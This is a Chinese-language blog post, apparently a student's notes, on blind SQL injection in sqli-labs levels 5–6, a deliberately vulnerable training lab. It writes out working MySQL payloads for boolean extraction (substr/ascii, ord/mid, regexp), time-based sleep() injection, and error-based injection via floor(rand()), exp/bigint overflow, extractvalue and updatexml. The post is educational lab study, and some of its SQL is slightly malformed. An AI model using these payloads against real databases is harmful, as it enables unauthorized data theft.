@@ -1,0 +1,438 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-Hans" color-mode=light>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>sqli-labs less5-6盲注 - Almond&#39;s Blog</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+  
+  <meta name="description" content="这两关中不再有数据回显到前端页面，需要利用一些方法、判...">
+  <meta name="author" content="Almond">
+  <link rel="icon" href="/images/icons/favicon-16x16.png" type="image/png" sizes="16x16">
+  <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
+  <link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png" sizes="180x180">
+  <meta rel="mask-icon" href="/images/icons/stun-logo.svg" color="#333333">
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/favicon-144x144.png">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1445822_s6x2xcokxrl.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+    
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">
+
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">
+
+      
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      lazyload: {
+        enable: true,
+        only_post: 'false',
+        loading: '/images/theme/loading.gif'
+      },
+      donate: {
+        enable: false,
+        alipay: 'https://pic.izhaoo.com/alipay.jpg',
+        wechat: 'https://pic.izhaoo.com/wechat.jpg'
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        always_show: false
+      },
+      carrier: {
+        enable: true
+      },
+      daovoice: {
+        enable: false
+      },
+      preview: {
+        background: {
+          default: '/images/theme/welcome-image.png',
+          api: ''
+        },
+        motto: {
+          default: 'There may be a great fire in our hearts,and the passers-by see only a wisp of smoke.',
+          api: '',
+          data_contents: '["data","content"]'
+        },
+      },
+      qrcode: {
+        enable: false,
+        type: 'url',
+        image: '',
+      },
+      toc: {
+        enable: true
+      },
+      scrollbar: {
+        model: 'simple'
+      },
+      notification: {
+        enable: false,
+        delay: 4500,
+        list: '',
+        page_white_list: '',
+        page_black_list: ''
+      }
+    }
+  </script>
+
+  
+
+  
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="lock-screen">
+  <div class="loading"></div>
+  
+
+
+  <nav class="navbar">
+    <div class="left">
+      
+      
+        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
+      
+    </div>
+    <div class="center">sqli-labs less5-6盲注</div>
+    <div class="right">
+      <i class="iconfont iconmenu j-navbar-menu"></i>
+    </div>
+    
+  </nav>
+
+  
+
+<nav class="menu">
+  <div class="menu-wrap">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content"><li class="menu-item">
+        <a href="/ " class="underline "> 首页</a>
+      </li><li class="menu-item">
+        <a href="/archives " class="underline "> 归档</a>
+      </li><li class="menu-item">
+        <a href="/tags " class="underline "> 标签</a>
+      </li><li class="menu-item">
+        <a href="/categories/ " class="underline "> 分类</a>
+      </li><li class="menu-item">
+        <a href="/about " class="underline "> 关于</a>
+      </li></ul>
+    
+      <div class="menu-copyright"><p>© 2021 Almond | Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+    
+  </div>
+</nav>
+  <main id="main">
+  <div class="article-wrap">
+    <div class="row container">
+      <div class="col-xl-3"></div>
+      <div class="col-xl-6"><article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="/images/theme/post-image9.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">sqli-labs less5-6盲注</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>November 22, 2020</span>
+      
+        <span class="post-info-item">
+          <i class="iconfont iconeye"></i><span id="/2020/11/22/sqli-labs%20less5-6%E7%9B%B2%E6%B3%A8/" class="leancloud" data-flag-title="sqli-labs less5-6盲注"></span>
+        </span>
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>1656</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        <p>这两关中不再有数据回显到前端页面，需要利用一些方法、判断进行尝试。</p>
+<h1 id="盲注的分类"><a href="#盲注的分类" class="headerlink" title="盲注的分类"></a>盲注的分类</h1><p>•基于布尔 SQL 盲注 </p>
+<p>•基于时间的 SQL 盲注 </p>
+<p>•基于报错的 SQL 盲注</p>
+<h2 id="基于布尔-SQL-盲注"><a href="#基于布尔-SQL-盲注" class="headerlink" title="基于布尔 SQL 盲注"></a>基于布尔 SQL 盲注</h2><h3 id="截取字符串相关函数"><a href="#截取字符串相关函数" class="headerlink" title="截取字符串相关函数"></a>截取字符串相关函数</h3><p><img   class="lazyload" data-original="image-20201124161121482.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">▲ascii(substr((<span class="hljs-keyword">select</span> table_name information_schema.tables <span class="hljs-keyword">where</span> tables_schema =<span class="hljs-keyword">database</span>()<span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">101</span> <span class="hljs-comment">--+ //substr()函数，ascii()函数 </span><br><span class="hljs-keyword">Explain</span>：<span class="hljs-keyword">substr</span>(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。<span class="hljs-keyword">Ascii</span>()将某个字符转换 为 <span class="hljs-keyword">ascii</span> 值 ▲<span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">substr</span>((selectdatabase()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">98</span> <br>▲<span class="hljs-keyword">ORD</span>(<span class="hljs-keyword">MID</span>((<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">IFNULL</span>(<span class="hljs-keyword">CAST</span>(username <span class="hljs-keyword">AS</span> <span class="hljs-built_in">CHAR</span>),<span class="hljs-number">0x20</span>)<span class="hljs-keyword">FROM</span> security.users <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">id</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">98</span>%<span class="hljs-number">23</span> <br>//<span class="hljs-keyword">ORD</span>()函数，<span class="hljs-keyword">MID</span>()函数 <span class="hljs-keyword">Explain</span>：<span class="hljs-keyword">mid</span>(a,b,c)从位置 b 开始，截取 a 字符串的 c 位 <span class="hljs-keyword">Ord</span>()函数同 <span class="hljs-keyword">ascii</span>()，将字符转为 <span class="hljs-keyword">ascii</span> 值<br><br></code></pre></td></tr></table></figure>
+
+<p>ord()→mid()</p>
+<p>ascii()→substr()                            这二者通常组合使用</p>
+<h3 id="regexp正则注入"><a href="#regexp正则注入" class="headerlink" title="regexp正则注入"></a>regexp正则注入</h3><p>这边拿user()来举个栗子，这边结果为root</p>
+<p><img   class="lazyload" data-original="image-20201130193453164.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>这边使用了if语句</p>
+<p>通过 if 语句的条件判断，返回一些条件句，比如 if 等构造一个判断。根据返回结果是否等 </p>
+<p>于 0 或者 1 进行判断。</p>
+<p>但是这里可以通过是否有回显进行判断结果的正确性。</p>
+<h4 id="通过regexp正则注入查表名"><a href="#通过regexp正则注入查表名" class="headerlink" title="通过regexp正则注入查表名"></a>通过regexp正则注入查表名</h4><p><img   class="lazyload" data-original="image-20201124204427880.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<h2 id="基于时间sql注入——延时注入"><a href="#基于时间sql注入——延时注入" class="headerlink" title="基于时间sql注入——延时注入"></a>基于时间sql注入——延时注入</h2><p>可与前面的截取字符串函数，逻辑判断联用</p>
+<p>举个栗子</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.199.132</span>/sqli-labs/Less-<span class="hljs-number">5</span>/?id=<span class="hljs-number">1</span>&#x27; and if(left(database(),<span class="hljs-number">1</span>)=&#x27;s&#x27;,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)--+<br></code></pre></td></tr></table></figure>
+
+<p>在网速不好的情况下，该方法注入会受其影响。</p>
+<h2 id="基于报错sql注入"><a href="#基于报错sql注入" class="headerlink" title="基于报错sql注入"></a>基于报错sql注入</h2><p>相比一个个手打或者等时长来说，报错sql注入确实方便很多。</p>
+<h3 id="▲Select-1-count-concat-0x3a-0x3a-select-user-0x3a-0x3a-floor-rand-0-2-a-from-information-schema-columns-group-by-a"><a href="#▲Select-1-count-concat-0x3a-0x3a-select-user-0x3a-0x3a-floor-rand-0-2-a-from-information-schema-columns-group-by-a" class="headerlink" title="▲Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a"></a>▲Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a</h3><p><img   class="lazyload" data-original="image-20201125220841958.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>[]: <a target="_blank" rel="noopener" href="https://www.freebuf.com/column/235496.html">https://www.freebuf.com/column/235496.html</a>    “Mysql报错注入之floor(rand(0)*2)报错原理探究”</p>
+<h3 id="利用-double-数值类型超出范围进行报错注入"><a href="#利用-double-数值类型超出范围进行报错注入" class="headerlink" title="利用 double 数值类型超出范围进行报错注入"></a>利用 double 数值类型超出范围进行报错注入</h3><h4 id="Exp-为以-e-为底的对数函数；版本在-5-5-5-5-5-53（之前）"><a href="#Exp-为以-e-为底的对数函数；版本在-5-5-5-5-5-53（之前）" class="headerlink" title="Exp()为以 e 为底的对数函数；版本在 5.5.5 ~5.5.53（之前）"></a>Exp()为以 e 为底的对数函数；版本在 5.5.5 ~5.5.53（之前）</h4><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(~(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">FROM</span>(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">USER</span>())a)) <br></code></pre></td></tr></table></figure>
+
+<h4 id="bigint-超出范围；-0-是对-0-逐位取反，版本在-5-5-5-5-5-53（之前）"><a href="#bigint-超出范围；-0-是对-0-逐位取反，版本在-5-5-5-5-5-53（之前）" class="headerlink" title="bigint 超出范围；~0 是对 0 逐位取反，版本在 5.5.5 ~5.5.53（之前）"></a>bigint 超出范围；~0 是对 0 逐位取反，版本在 5.5.5 ~5.5.53（之前）</h4><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> !(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())x) -（ps:这是减号） ~<span class="hljs-number">0</span> <br></code></pre></td></tr></table></figure>
+
+<p>好家伙，我这里mysql版本为5.5.53,并不能成功实现报错。</p>
+<h3 id="xpath-函数报错注入"><a href="#xpath-函数报错注入" class="headerlink" title="xpath 函数报错注入"></a>xpath 函数报错注入</h3><h4 id="extravalue-报错注入"><a href="#extravalue-报错注入" class="headerlink" title="extravalue()报错注入"></a>extravalue()报错注入</h4><p><img   class="lazyload" data-original="image-20201127195301610.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<h4 id="updatexml-报错注入"><a href="#updatexml-报错注入" class="headerlink" title="updatexml()报错注入"></a>updatexml()报错注入</h4><p><img   class="lazyload" data-original="image-20201127195328445.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>这里的0x7e可换为其他的十六进制符号编码，若为十六进制字母编码或者非十六进制编码则报错失败</p>
+<h3 id="利用数据的重复性"><a href="#利用数据的重复性" class="headerlink" title="利用数据的重复性"></a>利用数据的重复性</h3><p><img   class="lazyload" data-original="image-20201127204011874.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>据说这个只能查系统版本，改天来试一下好了。</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>大概整理了一下这两关注入所需的方法，今天好像是写这篇博客的的的的的的的的的。。。。。。。。对，第六天（27了，就离谱），讲真内容还蛮多的，慢慢来好了，反正我不急，我真的不着急。</p>
+
+      </section>
+      <section class="extra">
+        
+          <ul class="copyright">
+  
+    <li><strong>本文作者：</strong>Almond</li>
+    <li><strong>本文链接：</strong><a href="http://example.com/2020/11/22/sqli-labs%20less5-6%E7%9B%B2%E6%B3%A8/index.html" title="http:&#x2F;&#x2F;example.com&#x2F;2020&#x2F;11&#x2F;22&#x2F;sqli-labs%20less5-6%E7%9B%B2%E6%B3%A8&#x2F;index.html">http:&#x2F;&#x2F;example.com&#x2F;2020&#x2F;11&#x2F;22&#x2F;sqli-labs%20less5-6%E7%9B%B2%E6%B3%A8&#x2F;index.html</a></li>
+    <li><strong>版权声明：</strong>本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" title="BY-NC-SA" target="_blank" rel="noopener">BY-NC-SA</a> 许可协议，转载请注明出处！</li>
+  
+</ul>
+        
+        
+        
+  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqli-labs/" rel="tag">sqli-labs</a></li></ul> 
+
+        
+  <nav class="nav">
+    <a href="/2020/11/30/sqli-labs-less5-6/"><i class="iconfont iconleft"></i>sqli-labs-less5,6</a>
+    <a href="/2020/11/18/sqli-labs-1-4-%E5%B0%8F%E7%BB%93/">sqli-labs 1-4 小结<i class="iconfont iconright"></i></a>
+  </nav>
+
+      </section>
+      
+        <section class="comments">
+  
+    <div class="btn" id="comments-btn">查看评论</div>
+  
+  
+<div id="valine"></div>
+<script defer src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+  window.onload = function () {
+    var loadValine = function () {
+      new Valine({
+        el: '#valine',
+        appId: "mFmkxkQiWWHoWdmShYWGKpLA-gzGzoHsz",
+        appKey: "Cwy5hLAur0P89FwQ5J2sz9rz",
+        placeHolder: "昨夜小楼夜听雨",
+        avatar: "mp",
+        pagesize: "10",
+        lang: "zh-CN",
+      });
+    }
+    if ( true ) {
+      $("#comments-btn").on("click", function () {
+        $(this).hide();
+        loadValine();
+      });
+    } else {
+      loadValine();
+    }
+  };
+</script>
+
+</section>
+      
+    </section>
+  </div>
+</article></div>
+      <div class="col-xl-3">
+        
+          
+  <aside class="toc-wrap">
+    <h3 class="toc-title">文章目录：</h3>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8%E7%9A%84%E5%88%86%E7%B1%BB"><span class="toc-text">盲注的分类</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94-SQL-%E7%9B%B2%E6%B3%A8"><span class="toc-text">基于布尔 SQL 盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%AA%E5%8F%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-text">截取字符串相关函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#regexp%E6%AD%A3%E5%88%99%E6%B3%A8%E5%85%A5"><span class="toc-text">regexp正则注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4sql%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="toc-text">基于时间sql注入——延时注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99sql%E6%B3%A8%E5%85%A5"><span class="toc-text">基于报错sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%96%B2Select-1-count-concat-0x3a-0x3a-select-user-0x3a-0x3a-floor-rand-0-2-a-from-information-schema-columns-group-by-a"><span class="toc-text">▲Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-double-%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B%E8%B6%85%E5%87%BA%E8%8C%83%E5%9B%B4%E8%BF%9B%E8%A1%8C%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">利用 double 数值类型超出范围进行报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xpath-%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">xpath 函数报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%95%B0%E6%8D%AE%E7%9A%84%E9%87%8D%E5%A4%8D%E6%80%A7"><span class="toc-text">利用数据的重复性</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-text">小结</span></a></li></ol></li></ol>
+  </aside>
+
+        
+      </div>
+    </div>
+  </div>
+</main>
+  
+
+<footer class="footer">
+  <div class="footer-social"><a 
+        href="tencent://message/?Menu=yes&uin=695134722 "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#12B7F5'" 
+        onMouseOut="this.style.color='#556B2F'">
+          <i class="iconfont  iconQQ "></i>
+      </a><a 
+        href="https://github.com/Almondcloud "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#9f7be1'" 
+        onMouseOut="this.style.color='#556B2F'">
+          <i class="iconfont  icongithub-fill "></i>
+      </a><a 
+        href="mailto:695134722@qq.com "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color=#5F9EA0" 
+        onMouseOut="this.style.color='#556B2F'">
+          <i class="iconfont  iconmail"></i>
+      </a></div>
+  
+    <div class="footer-copyright"><p>© 2021 Almond | Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+  
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+  
+    <div class="scrollbar j-scrollbar">
+  <div class="scrollbar-current j-scrollbar-current"></div>
+</div>
+  
+  
+    
+<script src="/js/color-mode.js"></script>
+
+  
+</body>
+
+<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+
+
+<script src="/js/utils.js"></script>
+<script src="/js/script.js"></script>
+
+
+
+  <script>
+  $.getScript("//cdn.jsdelivr.net/npm/leancloud-storage@4.1.0/dist/av-min.js", () => {
+
+    AV.init({
+      appId: 'WX8aQk4GsrBk4AHV5fKhttEs-9Nh9j0Va',
+      appKey: 'KeFoQ67mYsmvsYyinfxfaaNk',
+      serverURLs: 'https://leancloud.cn/',
+    });
+
+    const showCount = (Counter) => {
+      const asyncLimit = new AsyncLimit(2);
+      $(".leancloud").each(async (e) => {
+        const url = $(".leancloud").eq(e).attr('id').trim();
+        const query = new AV.Query("Counter");
+        query.equalTo("words", url);
+        let count = await asyncLimit.run(() => query.count());
+        $(".leancloud").eq(e).text(count ? count : '--');
+      });
+    }
+
+    const addCount = (Counter) => {
+      const url = $(".leancloud").length === 1 ? $(".leancloud").attr('id').trim() : 'http://example.com';
+      var query = new Counter;
+      query.save({
+        words: url
+      });
+    }
+
+    $(function () {
+      const Counter = AV.Object.extend("Counter");
+      addCount(Counter);
+      showCount(Counter);
+    });
+
+  });
+</script>
+
+
+
+  <script>
+    (function () {
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</html>
